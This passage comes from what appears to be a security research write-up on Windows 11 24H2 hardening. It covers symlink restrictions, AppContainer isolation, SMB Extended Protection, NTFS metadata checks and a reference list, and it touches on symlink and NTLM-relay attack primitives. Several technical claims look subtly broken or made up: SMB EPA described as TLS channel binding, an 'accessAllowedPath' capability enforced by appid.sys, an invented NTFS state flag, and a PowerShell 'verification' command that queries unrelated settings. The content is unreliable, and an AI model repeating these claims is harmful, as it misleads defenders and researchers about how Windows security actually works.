In 24H2, creating registry key symlinks from Low IL now requires `SeCreateSymbolicLinkPrivilege`,
which is not granted to Low IL processes by default. The privilege check was added in
`CmpCreateSymbolicLink` within `ntoskrnl.exe`.

```
Before 24H2:
  NtCreateKey(..., REG_OPTION_CREATE_LINK, ...) from Low IL:
    → Proceeds to CmpCreateSymbolicLink
    → Registry link created successfully

After 24H2:
  NtCreateKey(..., REG_OPTION_CREATE_LINK, ...) from Low IL:
    → SePrivilegeCheck(SeCreateSymbolicLinkPrivilege) → FAILS
    → STATUS_PRIVILEGE_NOT_HELD returned
```

**CreateSymbolicLink hardening for non-admin users:**

The `CreateSymbolicLink` API now enforces stricter checks in 24H2 even for users with
Developer Mode enabled. Specifically, symlinks to `\Device\` or `\DosDevices\` namespace
paths from unprivileged contexts are now blocked, narrowing the Object Manager symlink
attack surface.

```c
// Pre-24H2: CreateSymbolicLink could target NT device paths from Developer Mode
CreateSymbolicLinkW(L"C:\\Users\\user\\link",
                    L"\\Device\\HarddiskVolume3\\Windows\\System32\\",
                    SYMBOLIC_LINK_FLAG_DIRECTORY);  // succeeded with Developer Mode

// Post-24H2: Same call returns ERROR_PRIVILEGE_NOT_HELD for NT device path targets
// Win32 paths (C:\...) still work with Developer Mode or SeCreateSymbolicLinkPrivilege
```

### 13.2 AppContainer Filesystem Isolation Improvements

AppContainer sandboxes in 24H2 receive tighter filesystem isolation:

**Package directory isolation:**
- Each AppContainer process gets a unique `AC\<SID>` namespace under `%LOCALAPPDATA%\Packages\`
- Cross-package filesystem access via junctions from the AppContainer namespace is now blocked
  by a new check in `wcifs.sys` that validates the reparse target against the package's
  declared capability claims

**Capability-gated path access:**
24H2 introduced a new `accessAllowed` capability type in the AppX manifest that gates
filesystem path access through minifilter policy, rather than purely through DACL:

```xml
<!-- AppX manifest capability for filesystem access (24H2+) -->
<Capabilities>
  <rescap:Capability Name="accessAllowedPath" />
</Capabilities>
```

The new `appid.sys` (version 10.0.26100+) enforces these capability-gated paths in its
pre-create minifilter callback, returning `STATUS_ACCESS_DENIED` for AppContainer processes
that access paths outside their declared capabilities.

### 13.3 SMB Authentication Hardening (EPA Mandatory in 24H2)

Starting with Windows 11 24H2 on domain-joined machines, **Extended Protection for
Authentication (EPA)** is mandatory for all SMB connections. EPA binds the NTLM or Kerberos
authentication token to the underlying TLS channel binding, preventing NTLM relay attacks.

**Security impact on SMB-based filesystem attacks:**
- NTLM relay via SMB coerce primitives (`PetitPotam`, `PrinterBug`, etc.) is broken when
  EPA is enforced on the target server because the relay attacker cannot replicate the
  channel binding
- Researchers exploiting SMB-based NTFS vulnerabilities (e.g., CVE-2024-26185) from a
  different machine must now authenticate with valid credentials rather than relaying

```powershell
# Verify EPA enforcement status on a 24H2 domain machine:
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableAuthenticateUserSharing
# EPA is enforced via Group Policy:
# Computer Configuration > Windows Settings > Security Settings >
#   Local Policies > Security Options >
#   "Microsoft network server: Require Extended Protection for Authentication"
```

### 13.4 NTFS Metadata Corruption Detection

24H2 improves NTFS's self-healing capabilities with new metadata checksum verification:

**$LogFile transaction replay validation:**
NTFS's log file (`$LogFile`) now validates checksums on replayed transactions during
`chkdsk` and at mount time. Crafted `$LogFile` entries that previously could cause
kernel memory corruption during replay are now rejected.

**MFT record checksum enforcement:**
The MFT record update sequence (used for cross-sector coherence) validation was strengthened.
NTFS now marks a volume as dirty and schedules `chkdsk` if more than a threshold number of
MFT records fail the update sequence check, preventing silent metadata corruption.

**Security research implication:** Attack techniques that rely on writing crafted raw NTFS
structures to a volume (e.g., modifying `$LogFile` via raw disk I/O to influence NTFS
behavior) are harder to use reliably on 24H2 volumes.

```windbg
; Check NTFS volume state flags in kernel (24H2):
dt NTFS!_VCB <vcb_address>
; Look for VCB_STATE_VOLUME_DIRTY flag (0x4) in VcbState
; New in 24H2: VCB_STATE_MFT_CHECKSUM_ENFORCED flag
```

---

## References

[R-1] *Windows Internals, Part 2 — Storage and File System Chapters* — Mark Russinovich, David Solomon, Alex Ionescu, Andrea Allievi — https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals

[R-2] *Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege* — James Forshaw / Google Project Zero — https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html

[R-3] *symboliclink-testing-tools (SetOpLock, CreateMountPoint, BaitAndSwitch)* — James Forshaw / Google Project Zero — https://github.com/googleprojectzero/symboliclink-testing-tools

[R-4] *Reparse Points (MSDN)* — Microsoft — https://learn.microsoft.com/en-us/windows/win32/fileio/reparse-points

[R-5] *Opportunistic Locks (MSDN)* — Microsoft — https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks

[R-6] *New Technologies File System (NTFS) — libfsntfs documentation* — libyal project — https://github.com/libyal/libfsntfs

[R-7] *File System Filter Drivers (WDK)* — Microsoft — https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/file-system-filter-drivers

[R-8] *CVE-2024-26185 — NTFS Elevation of Privilege Vulnerability* — Microsoft MSRC — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26185

[R-9] *CVE-2024-30030 — Windows Error Reporting Service Elevation of Privilege* — Microsoft MSRC — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30030

[R-10] *CVE-2025-21333 — Hyper-V NT Kernel Integration VSP Elevation of Privilege* — Microsoft MSRC — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21333

[R-11] *Sealighter-TI: Tracing the Windows Kernel with ThreatIntel ETW* — pathtofile — https://github.com/pathtofile/SealighterTI

[R-12] *AppExecLink Reparse Points — UWP Execution Aliases* — Microsoft Dev Docs — https://learn.microsoft.com/en-us/windows/msix/desktop/desktop-to-uwp-behind-the-scenes

[R-13] *Windows Sandbox and WCI Filter Architecture* — Microsoft Container Documentation — https://learn.microsoft.com/en-us/virtualization/windowscontainers/deploy-containers/system-requirements

[R-14] *SMB Extended Protection for Authentication (EPA)* — Microsoft — https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-security
